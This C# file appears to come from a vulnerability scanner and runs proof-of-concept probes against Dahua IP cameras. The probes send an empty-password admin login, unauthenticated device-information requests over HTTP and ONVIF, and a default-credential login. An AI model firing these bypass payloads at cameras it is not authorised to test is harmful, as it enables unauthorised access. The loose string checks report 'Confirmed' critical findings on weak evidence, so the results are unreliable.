using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using NetSecurityScanner.Core.Models;

namespace NetSecurityScanner.Core.Services
{
    public class DahuaPoC
    {
        private readonly HttpClient _http;
        private readonly ILogger _logger;

        public DahuaPoC(HttpClient http, ILogger logger)
        {
            _http = http;
            _logger = logger;
        }

        public async Task<List<CameraVulnFinding>> RunAllAsync(CameraScanTarget target, CancellationToken ct)
        {
            var findings = new List<CameraVulnFinding>();
            var ctsCancel = CancellationTokenSource.CreateLinkedTokenSource(ct);
            ctsCancel.CancelAfter(TimeSpan.FromSeconds(30));
            var linkedCt = ctsCancel.Token;

            try
            {
                var tasks = new[]
                {
                    PocCve202133044Async(target, linkedCt),
                    PocCve202133045Async(target, linkedCt),
                    PocCve202230563Async(target, linkedCt),
                    PocRpc2LoginBypassAsync(target, linkedCt)
                };
                var results = await Task.WhenAll(tasks);
                foreach (var f in results)
                    if (f != null) findings.Add(f);
            }
            catch (Exception ex) when (ex is not OperationCanceledException)
            {
                _logger.LogDebug(ex, "Dahua PoC batch failed");
            }

            return findings;
        }

        private async Task<CameraVulnFinding?> PocCve202133044Async(CameraScanTarget target, CancellationToken ct)
        {
            var url = $"{target.Protocol}://{target.IpAddress}:{target.Port}/RPC2_Login";
            try
            {
                using var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                cts.CancelAfter(5000);

                var payload = "{\"method\":\"global.login\",\"params\":{\"authorityType\":0,\"passwordType\":\"Plain\",\"userName\":\"admin\",\"password\":\"\"},\"id\":1}";
                var content = new StringContent(payload, Encoding.UTF8, "application/json");
                var resp = await _http.PostAsync(url, content, cts.Token);
                var body = await resp.Content.ReadAsStringAsync(ct);

                if (body.Contains("\"result\":0") || body.Contains("session"))
                {
                    _logger.LogWarning("[PoC] CVE-2021-33044 confirmed on {Ip}", target.IpAddress);
                    return new CameraVulnFinding
                    {
                        CveId = "CVE-2021-33044",
                        Name = "大华身份认证绕过漏洞",
                        Severity = "Critical",
                        CvssScore = 9.8,
                        Vendor = "Dahua",
                        Confirmed = true,
                        Endpoint = url,
                        Evidence = $"空密码登录 admin 成功，返回: {body.Substring(0, Math.Min(300, body.Length))}",
                        DetectionMethod = "AuthBypassEmptyPwd"
                    };
                }
            }
            catch (Exception ex) when (ex is not OperationCanceledException) { _logger.LogDebug(ex, "CVE-2021-33044 probe failed"); }
            return null;
        }

        private async Task<CameraVulnFinding?> PocCve202133045Async(CameraScanTarget target, CancellationToken ct)
        {
            var url = $"{target.Protocol}://{target.IpAddress}:{target.Port}/dh/middlewareJson/deviceInfo";
            try
            {
                using var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                cts.CancelAfter(5000);

                var resp = await _http.GetAsync(url, cts.Token);
                var body = await resp.Content.ReadAsStringAsync(ct);

                if (resp.IsSuccessStatusCode && (body.Contains("deviceName") || body.Contains("model") || body.Contains("serial")))
                {
                    return new CameraVulnFinding
                    {
                        CveId = "CVE-2021-33045",
                        Name = "大华环路检测认证绕过",
                        Severity = "Critical",
                        CvssScore = 9.8,
                        Vendor = "Dahua",
                        Confirmed = true,
                        Endpoint = url,
                        Evidence = $"未授权访问设备信息接口成功: {body.Substring(0, Math.Min(200, body.Length))}",
                        DetectionMethod = "LoopbackBypass"
                    };
                }
            }
            catch (Exception ex) when (ex is not OperationCanceledException) { _logger.LogDebug(ex, "CVE-2021-33045 probe failed"); }
            return null;
        }

        private async Task<CameraVulnFinding?> PocCve202230563Async(CameraScanTarget target, CancellationToken ct)
        {
            var url = $"{target.Protocol}://{target.IpAddress}:{target.Port}/onvif/device_service";
            try
            {
                using var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                cts.CancelAfter(5000);

                var soap = "<?xml version=\"1.0\" encoding=\"utf-8\"?>" +
                    "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"" +
                    " xmlns:wsa=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\"" +
                    " xmlns:tns=\"http://www.onvif.org/ver10/device/wsdl\">" +
                    "<soap:Header><wsa:Action>http://www.onvif.org/ver10/device/wsdl/GetDeviceInformation</wsa:Action></soap:Header>" +
                    "<soap:Body><tns:GetDeviceInformation/></soap:Body></soap:Envelope>";

                var content = new StringContent(soap, Encoding.UTF8, "application/xml");
                var resp = await _http.PostAsync(url, content, cts.Token);
                var body = await resp.Content.ReadAsStringAsync(ct);

                if (body.Contains("GetDeviceInformationResponse") || body.Contains("Manufacturer") || body.Contains("Model"))
                {
                    return new CameraVulnFinding
                    {
                        CveId = "CVE-2022-30563",
                        Name = "大华 ONVIF 未授权访问",
                        Severity = "High",
                        CvssScore = 7.5,
                        Vendor = "Dahua",
                        Confirmed = true,
                        Endpoint = url,
                        Evidence = "未授权 ONVIF SOAP 请求获取设备信息成功",
                        DetectionMethod = "UnauthOnvif"
                    };
                }
            }
            catch (Exception ex) when (ex is not OperationCanceledException) { _logger.LogDebug(ex, "CVE-2022-30563 probe failed"); }
            return null;
        }

        private async Task<CameraVulnFinding?> PocRpc2LoginBypassAsync(CameraScanTarget target, CancellationToken ct)
        {
            var url = $"{target.Protocol}://{target.IpAddress}:{target.Port}/RPC2_Login";
            try
            {
                using var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                cts.CancelAfter(5000);

                var payload = "{\"method\":\"global.login\",\"params\":{\"authorityType\":0,\"passwordType\":\"MD5\",\"userName\":\"admin\",\"password\":\"b18e54df5a56760af42b1dc2ce92e0ef\"},\"id\":1}";
                var content = new StringContent(payload, Encoding.UTF8, "application/json");
                var resp = await _http.PostAsync(url, content, cts.Token);
                var body = await resp.Content.ReadAsStringAsync(ct);

                if (body.Contains("\"result\":0") || body.Contains("session"))
                {
                    return new CameraVulnFinding
                    {
                        CveId = "CVE-WP-DEFAULT",
                        Name = "大华默认密码 admin/admin 可登录",
                        Severity = "Critical",
                        CvssScore = 10.0,
                        Vendor = "Dahua",
                        Confirmed = true,
                        Endpoint = url,
                        Evidence = "使用默认凭据 admin/admin (MD5) 登录成功",
                        DetectionMethod = "DefaultCredential"
                    };
                }
            }
            catch (Exception ex) when (ex is not OperationCanceledException) { _logger.LogDebug(ex, "Default credential probe failed"); }
            return null;
        }
    }
}